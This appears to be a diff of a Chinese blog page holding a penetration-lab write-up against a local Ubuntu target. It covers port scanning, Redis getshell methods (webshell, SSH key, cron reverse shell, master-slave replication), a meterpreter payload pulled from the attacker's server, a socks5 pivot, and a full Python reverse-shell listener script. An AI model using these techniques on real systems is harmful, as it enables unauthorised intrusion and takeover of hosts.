@@ -244,27 +244,16 @@
 
           
           
+          
+          
           <li>
-            <a href="/about/">
+            <a href="/categories/">
               
-              关于
+              分类
               
               
             </a>
           </li>
-          
-          
-          
-          <li>
-            <a href="/tags/">
-              
-              标签
-              
-              
-            </a>
-          </li>
-          
-          
           
           
           
@@ -280,9 +269,20 @@
           
           
           <li>
-            <a href="/categories/">
+            <a href="/about/">
               
-              分类
+              关于
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/tags/">
+              
+              标签
               
               
             </a>
@@ -474,10 +474,8 @@
       <!-- Post Container -->
       <div class="col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <h1>练习 - Ubuntu19渗透</h1>
-<hr>
-<h2 id="目标配置">- 目标配置 -</h2>
-<p>攻击机：</p>
+        <h1 id="练习-Ubuntu19渗透"><a href="#练习-Ubuntu19渗透" class="headerlink" title="练习 - Ubuntu19渗透"></a>练习 - Ubuntu19渗透</h1><hr>
+<h2 id="目标配置"><a href="#目标配置" class="headerlink" title="- 目标配置 -"></a>- 目标配置 -</h2><p> 攻击机：</p>
 <ul>
 <li>Kali(msf6)：192.168.111.133</li>
 </ul>
@@ -486,9 +484,7 @@
 <li>Ubuntu19：192.168.111.142</li>
 </ul>
 <hr>
-<h2 id="具体步骤">- 具体步骤 -</h2>
-<h3 id="信息搜集-getshell">- 信息搜集 &amp; getshell -</h3>
-<p>话不说，直接上 <strong>端口扫描</strong> 吧：</p>
+<h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="- 具体步骤 -"></a>- 具体步骤 -</h2><h3 id="信息搜集-amp-getshell"><a href="#信息搜集-amp-getshell" class="headerlink" title="- 信息搜集 &amp; getshell -"></a>- 信息搜集 &amp; getshell -</h3><p>话不说，直接上 <strong>端口扫描</strong> 吧：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -A -sV -p- 192.168.111.142</span><br></pre></td></tr></table></figure>
 <p>得到结果：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/ctf/python]</span><br><span class="line">└─<span class="comment"># nmap -O -A -sV -p- 192.168.111.142 </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-13 08:55 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.111.142</span><br><span class="line">Host is up (0.00056s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 ca:5d:8f:1a:58:0c:cb:eb:39:b7:7a:aa:e5:d0:ed:5d (RSA)</span><br><span class="line">|   256 d3:dd:e1:1e:ad:1b:a5:c3:55:4b:70:29:3b:4e:ea:be (ECDSA)</span><br><span class="line">|_  256 14:a7:b5:af:3a:15:f3:df:70:e4:ad:4d:cf:c1:65:0d (ED25519)</span><br><span class="line">80/tcp   open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: GXU\xE5\x92\x95\xE5\x99\x9C\xE7\x81\xB5\xE6\xB3\xA2~\xE5\xB9\xB3\xE5\x8F\xB0</span><br><span class="line">6379/tcp open  redis   Redis key-value store</span><br><span class="line">MAC Address: 00:0C:29:83:43:B8 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.56 ms 192.168.111.142</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 23.79 seconds</span><br></pre></td></tr></table></figure>
@@ -500,26 +496,22 @@
 <li>6379端口：redis</li>
 </ul>
 <p>行吧，这个靶机看起还挺稳固的，开的端口不是很多。由于开放的端口比较少，这里依次对所开放的端口进行攻击尝试。</p>
-<h4 id="21端口-ftp">- 21端口 (ftp) -</h4>
-<p>从上边的 <strong>nmap</strong> 扫描结果，轻易的出来这个 <strong>ftp</strong> 应用为 <strong>vsftpd 3.0.3</strong> 的，不妨直接使用 <strong>msf</strong> 进行尝试。</p>
+<h4 id="21端口-ftp"><a href="#21端口-ftp" class="headerlink" title="- 21端口 (ftp) -"></a>- 21端口 (ftp) -</h4><p>从上边的 <strong>nmap</strong> 扫描结果，轻易的出来这个 <strong>ftp</strong> 应用为 <strong>vsftpd 3.0.3</strong> 的，不妨直接使用 <strong>msf</strong> 进行尝试。</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210313220313.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210313220312817"></p>
 <p>emmm，这个版本似乎是比较久远了，显然是不太行的了。可以试试看吧。</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210313220452.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210313220452121"></p>
 <p>确实不太行，试试看能否从 <strong>匿名用户</strong> 登录以便搜集一些信息啥的。</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210313224628.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210313224628406"></p>
 <p>匿名用户看起来也是不行的了，暴力破解显然是不太可取的。那么 <strong>ftp</strong> 这条路就暂且搁置。</p>
-<h4 id="22端口-ssh">- 22端口 (ssh) -</h4>
-<p>还是先用 <strong>msf</strong> 的侦察模块去试一下吧，</p>
+<h4 id="22端口-ssh"><a href="#22端口-ssh" class="headerlink" title="- 22端口 (ssh) -"></a>- 22端口 (ssh) -</h4><p>还是先用 <strong>msf</strong> 的侦察模块去试一下吧，</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210313224910.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210313224910484"></p>
 <p>这里得到了有关靶机的 <strong>ssh</strong> 信息，然后尝试 <strong>枚举</strong> 一下 <strong>ssh</strong> 的用户：</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210313230221.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210313230221066"></p>
 <p>看起来靶机是开了 <strong>防火墙</strong> 了，不仅对枚举进行 <strong>假正确</strong> 响应，还对暴力枚举进行了次数限制。那就先暂时放弃对 <strong>ssh</strong> 的攻击吧。</p>
-<h4 id="80端口-http">- 80端口 (http) -</h4>
-<p>emmm，实话说这个 <strong>web</strong> 端确实挺有意思的，不过实际上也就是个静态页面而已，没啥突破口可言。</p>
+<h4 id="80端口-http"><a href="#80端口-http" class="headerlink" title="- 80端口 (http) -"></a>- 80端口 (http) -</h4><p>emmm，实话说这个 <strong>web</strong> 端确实挺有意思的，不过实际上也就是个静态页面而已，没啥突破口可言。</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210313234213.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210313234213299"></p>
 <p>虽然这里得知这个服务器是 <strong>nginx1.14.0</strong> ，但是一个静态网页确实没啥办法啦，直接放弃吧。</p>
-<h4 id="6379端口-getshell-redis">- 6379端口 &amp; getshell (redis) -</h4>
-<p>说到 <strong>redis</strong> ，这里可以尝试访问：</p>
+<h4 id="6379端口-amp-getshell-redis"><a href="#6379端口-amp-getshell-redis" class="headerlink" title="- 6379端口 &amp; getshell (redis) -"></a>- 6379端口 &amp; getshell (redis) -</h4><p>说到 <strong>redis</strong> ，这里可以尝试访问：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.111.142</span><br></pre></td></tr></table></figure>
 <p>结果是可以进去的，但并不能直接执行指令，还需要进一步认证：</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314185923.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314185923784"></p>
@@ -555,26 +547,22 @@
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314212129.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314212128974"></p>
 <p>显然是成功认证了，那么就可以使用靶机上的 <strong>redis</strong> 了。说到 <strong>redis</strong> ，实际上有 <strong>4</strong> 种方式来 <strong>getshell</strong> ，这里一一列举说明并尝试看看吧。</p>
 <ul>
-<li>
-<p>第一种，写 <strong>webshell</strong> ：</p>
+<li><p>第一种，写 <strong>webshell</strong> ：</p>
 <p>emmm，这个原理其实也很简单，由于现在已经可以操作 <strong>redis</strong> 了，就可以把带有 <strong>[一句话]</strong> 的内容存在 <strong>键值对</strong> 中，然后将 <strong>redis数据库</strong> 导出到 <strong>web</strong> 目录中的 <strong>特定的文件名</strong> 中，比如 (.php、.jsp啥的) 就行了。</p>
 <p>那么这里先简单写一个 <strong>.html</strong> 文件试试：</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314212937.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314212937892"></p>
 <p>看起来并没有成功，其实还有很多不确定的因素在里边的，比如 <strong>是否拥有写权限</strong> 这就很重要。一般高版本 <strong>redis</strong> 用户的权限都是极低的，当然也有可能是 <strong>web</strong> 目录没有写权限。</p>
 </li>
-<li>
-<p>第二种，写 <strong>ssh</strong> 密钥：</p>
+<li><p>第二种，写 <strong>ssh</strong> 密钥：</p>
 <p>这个就比较麻烦了，由于 <strong>redis</strong> 无法读本地文件，所以不知道靶机上具体拥有的用户有哪些，而 <strong>root</strong> 用户启动 <strong>redis</strong> 又几乎是不太可能的，况且高版本的 <strong>redis</strong> 默认是 <strong>redis</strong> 用户，权限极低。不过也可以简单试一试是否拥有写权限。</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314213259.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314213259723"></p>
 <p>还是直接放弃吧，看得出来这个 <strong>redis</strong> 应该是个权限极低的 <strong>redis</strong> 用户了。</p>
 </li>
-<li>
-<p>第三种，写 <strong>计划任务</strong> 来反弹shell：</p>
+<li><p>第三种，写 <strong>计划任务</strong> 来反弹shell：</p>
 <p>至于 <strong>计划任务</strong> 也就是将内容写入 ，也就是将弹shell的语句写入 <strong>计划任务</strong> 中执行 。在 <strong>ubuntu</strong> 和 <strong>kali</strong> 中，得写到 <code>/var/spool/cron/crontabs/root</code> ，而 <strong>centos</strong> 得写入 <code>/var/spool/cron/root</code> 中。只是这玩意几乎是不太可能的。</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314214810.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314214810353"></p>
 </li>
-<li>
-<p>第四种，依靠 <strong>主从复制</strong> 来执行命令：</p>
+<li><p>第四种，依靠 <strong>主从复制</strong> 来执行命令：</p>
 <p>说到 <strong>主从复制</strong> 这应该是这几年的比较新颖的攻击方式了吧（据说是从 ctf 出的），这里就部分摘抄 <a target="_blank" rel="noopener" href="https://paper.seebug.org/975/">链接</a> 说明一下好了。</p>
 <p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。</p>
 <p>为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
@@ -588,8 +576,7 @@
 <p>行吧，话不多说，这里就直接弹一个 <strong>伪完整交互shell</strong> 了。</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314215956.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314215956063"></p>
 <p>此时此刻，就拿到了shell了。</p>
-<h3 id="横向移动-权限提升">- 横向移动 &amp; 权限提升 -</h3>
-<p>虽然说现在确实是得到了一个shell，但 <strong>redis</strong> 用户的权限实在是太低了，低到就算是在 <strong>/tmp</strong> 目录搞事都不太行的。比如这里简单演示一下在 <strong>/tmp</strong> 目录搞点花样：</p>
+<h3 id="横向移动-amp-权限提升"><a href="#横向移动-amp-权限提升" class="headerlink" title="- 横向移动 &amp; 权限提升 -"></a>- 横向移动 &amp; 权限提升 -</h3><p>虽然说现在确实是得到了一个shell，但 <strong>redis</strong> 用户的权限实在是太低了，低到就算是在 <strong>/tmp</strong> 目录搞事都不太行的。比如这里简单演示一下在 <strong>/tmp</strong> 目录搞点花样：</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314221218.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314221218340"></p>
 <p>几乎啥事也干不了，那再看真正的上帝视角，在 <strong>/tmp</strong> 是有很多文件的：</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314221257.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314221257391"></p>
@@ -600,8 +587,7 @@
 <p>但这实在是非常的鸡肋，基本没用啊。因为这个目录是只有 <strong>redis</strong> 用户自己可以进去读文件的，也就是自己写给自己看，没法进一步利用。</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314221642.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314221641944"></p>
 <p>不过，既然能够写文件，那也就可以写 <strong>msf木马</strong> 啦。</p>
-<h4 id="msf-获取-metershell">- msf 获取 metershell -</h4>
-<p>这里生成一个简单的 <strong>msf木马</strong> ，然后开一下 <strong>http服务器</strong> 以便从靶机拉取 <strong>msf木马</strong> 。</p>
+<h4 id="msf-获取-metershell"><a href="#msf-获取-metershell" class="headerlink" title="- msf 获取 metershell -"></a>- msf 获取 metershell -</h4><p>这里生成一个简单的 <strong>msf木马</strong> ，然后开一下 <strong>http服务器</strong> 以便从靶机拉取 <strong>msf木马</strong> 。</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314222052.png?x-oss-process=image/auto-orient,1/interlace,1" alt="img"></p>
 <p>然而，并没有成功：</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314222326.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314222326820"></p>
@@ -615,8 +601,7 @@
 <p>emmm，这里是成功拿到了 <strong>meterpretershell</strong> 了。可以尝试搜寻 <strong>提权建议</strong> 试试。</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315103436.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315103436728"></p>
 <p>看起来是不太行了，那么可是尝试 <strong>横向移动</strong> 。</p>
-<h4 id="开启代理">- 开启代理 -</h4>
-<p>首先，可以简单看一下 <strong>靶机</strong> 当前的内网情况，显然有一个 <strong>172.16.243.0/24</strong> 段。</p>
+<h4 id="开启代理"><a href="#开启代理" class="headerlink" title="- 开启代理 -"></a>- 开启代理 -</h4><p>首先，可以简单看一下 <strong>靶机</strong> 当前的内网情况，显然有一个 <strong>172.16.243.0/24</strong> 段。</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315104645.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315104645353"></p>
 <p>那么开启一个简单的 <strong>socks5</strong> 吧。先设置一个自动路由：</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315104751.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315104750901"></p>
@@ -627,8 +612,7 @@
 <p>那么可以简单验证一下该代理是否已经被开启了，比如尝试访问一下 <strong>靶机</strong> 的另一个IP <strong>172.16.243.220</strong> 。</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315110004.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315110003844"></p>
 <p>那么不妨再简单的看如何从 <strong>redis</strong> 用户逃逸出来，比如想办法拿一个 <strong>webshell</strong> 即把用户从 <strong>redis</strong> 逃逸成 <strong>www-data</strong> 用户了。</p>
-<h4 id="获取-webshell">- 获取 webshell -</h4>
-<p>首先，看一下网络目录，为 <code>/var/www/web</code></p>
+<h4 id="获取-webshell"><a href="#获取-webshell" class="headerlink" title="- 获取 webshell -"></a>- 获取 webshell -</h4><p>首先，看一下网络目录，为 <code>/var/www/web</code></p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315110247.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315110247188"></p>
 <p>但是咱们显然是没有直接的写权限的：</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315110343.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315110343724"></p>
@@ -659,7 +643,7 @@
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315113400.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315113400184"></p>
 <p>只是从 <strong>phpinfo</strong> 里面可以看出，系统函数都给 <strong>ban</strong> 了：</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315114322.png?x-oss-process=image/auto-orient,1/interlace,1" alt="img"></p>
-<p>遇事不决，直接上 <strong>甜甜圈</strong> 好了，直接 <code>python3 -m pip install doughnuts &amp;&amp; python3 -m doughnuts.install [命令名] </code>，比如我这里为：</p>
+<p>遇事不决，直接上 <strong>甜甜圈</strong> 好了，直接 <code>python3 -m pip install doughnuts &amp;&amp; python3 -m doughnuts.install [命令名]</code>，比如我这里为：</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315113715.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315113715075"></p>
 <p>然后输入 <code>dh</code> 即可开启。</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315113749.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315113749519"></p>
@@ -669,13 +653,11 @@
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315114512.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315114512863"></p>
 <p>显然是成功了！那么可以使用 <strong>伪完整交互式shell</strong> 接收脚本去接收一个反弹shell吧，这里先上脚本：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> error, socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR</span><br><span class="line"><span class="keyword">from</span> termios <span class="keyword">import</span> tcgetattr, tcsetattr, TCSADRAIN</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdin, stdout, version_info, argv</span><br><span class="line"><span class="keyword">from</span> tty <span class="keyword">import</span> setraw</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path, system, _exit</span><br><span class="line"></span><br><span class="line"><span class="comment"># import thread, deal with byte</span></span><br><span class="line"><span class="keyword">if</span> (version_info.major == <span class="number">2</span>):</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_byte</span>(<span class="params"> s, encoding = <span class="string">&quot;UTF-8&quot;</span> </span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">bytearray</span>(s, encoding))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    STDOUT = stdout</span><br><span class="line">    <span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_byte</span>(<span class="params"> s, encoding = <span class="string">&quot;UTF-8&quot;</span> </span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(s, encoding = encoding)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    STDOUT = stdout.buffer</span><br><span class="line">    <span class="keyword">import</span> _thread <span class="keyword">as</span> thread</span><br><span class="line"></span><br><span class="line">FD = <span class="literal">None</span></span><br><span class="line">OLD_SETTINGS = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_GetchUnix</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params"> self </span>):</span></span><br><span class="line">        <span class="keyword">global</span> FD, OLD_SETTINGS</span><br><span class="line">        FD = stdin.fileno( )</span><br><span class="line">        OLD_SETTINGS = tcgetattr(FD)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            setraw(stdin.fileno( ))</span><br><span class="line">            ch = stdin.read(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            tcsetattr(FD, TCSADRAIN, OLD_SETTINGS)</span><br><span class="line">        <span class="keyword">return</span> ch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getch = _GetchUnix( )</span><br><span class="line"></span><br><span class="line">CONN_ONLINE = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stdprint</span>(<span class="params"> message </span>):</span></span><br><span class="line">    stdout.write(message)</span><br><span class="line">    stdout.flush( )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close_socket</span>(<span class="params"> talk, exit_code = <span class="number">0</span> </span>):</span></span><br><span class="line">    <span class="keyword">global</span> FD, OLD_SETTINGS, CONN_ONLINE</span><br><span class="line">    CONN_ONLINE = <span class="number">0</span></span><br><span class="line">    talk.close( )</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tcsetattr(FD, TCSADRAIN, OLD_SETTINGS)</span><br><span class="line">    <span class="keyword">except</span> TypeError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    system(<span class="string">&quot;reset&quot;</span>)</span><br><span class="line">    _exit(exit_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv_daemon</span>(<span class="params"> conn </span>):</span></span><br><span class="line">    <span class="keyword">global</span> CONN_ONLINE</span><br><span class="line">    <span class="keyword">while</span> CONN_ONLINE:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            tmp = conn.recv(<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> (tmp):</span><br><span class="line">                STDOUT.write(tmp)</span><br><span class="line">                stdout.flush( )</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> error</span><br><span class="line">        <span class="keyword">except</span> error:</span><br><span class="line">            msg = <span class="string">&quot;Connection close by socket.\n&quot;</span></span><br><span class="line">            stdprint(msg)</span><br><span class="line">            close_socket(conn, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params"> port </span>):</span></span><br><span class="line">    conn = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    conn.setsockopt(SOL_SOCKET, SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    conn.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, port))</span><br><span class="line">    conn.listen(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        talk, addr = conn.accept( )</span><br><span class="line">        stdprint(<span class="string">&quot;Connect from %s.\n&quot;</span> % addr[ <span class="number">0</span> ])</span><br><span class="line">        thread.start_new_thread(recv_daemon, (talk,))</span><br><span class="line">        talk.send(get_byte(<span class="string">&quot;&quot;&quot;python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;\n&quot;&quot;&quot;</span>, encoding = <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        talk.send(get_byte(<span class="string">&quot;&quot;&quot;clear\n&quot;&quot;&quot;</span>, encoding = <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">while</span> CONN_ONLINE:</span><br><span class="line">            c = getch( )</span><br><span class="line">            <span class="keyword">if</span> c:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    talk.send(get_byte(c, encoding = <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="keyword">except</span> error:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        <span class="comment"># stdprint(&quot;Connection close by KeyboardInterrupt.\n&quot;)</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        stdprint(<span class="string">&quot;Connection close...\n&quot;</span>)</span><br><span class="line">        close_socket(conn, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(argv) &lt; <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;usage:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;      python %s [port]&quot;</span> % path.basename(argv[ <span class="number">0</span> ]))</span><br><span class="line">        exit(<span class="number">2</span>)</span><br><span class="line">    main(<span class="built_in">int</span>(argv[ <span class="number">1</span> ]))</span><br></pre></td></tr></table></figure>
-<p>这里先运行脚本进行监听，然后使用 <strong>甜甜圈</strong> 弹个shell：<br>
-<img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315114846.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315114846324"></p>
